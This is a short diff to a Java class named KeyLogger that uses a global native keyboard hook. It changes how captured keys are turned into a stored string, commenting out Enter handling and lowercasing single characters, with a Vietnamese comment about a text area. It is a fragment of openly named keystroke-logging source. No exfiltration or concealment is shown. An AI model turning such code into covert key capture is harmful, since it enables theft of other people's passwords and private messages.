@@ -37,9 +37,10 @@ public class KeyLogger implements NativeKeyListener {
              case "Space":
                  store += " ";
                  break;
-             case "Enter":
-                 store += "\n";
-                 break;
+                 // khong biet sao JtextArea ko cho xuong dong
+//             case "Enter":
+//                 store += "\n";
+//                 break;
              case "Open Bracket":
                  store += "[";
                  break;
@@ -68,24 +69,24 @@ public class KeyLogger implements NativeKeyListener {
                  store += "=";
                  break;
              default:
-                store += key;
-                break;
-         } //end of switch
-        
-//        sb.append(key);
-    }
+                if (key.length() > 1) {
+                    store += key;
+
+                } else {
+                    store += key.toLowerCase();
+
+                }
+               break;
+            }
+        } //end of switch
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent e) {
-//        String key = NativeKeyEvent.getKeyText(e.getKeyCode());
-//        System.out.println("Released: " + key);
 
-//        store += key;
-//        sb.append(key);
     }
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent e){
-        store = store.toLowerCase();
+        
     }
 }
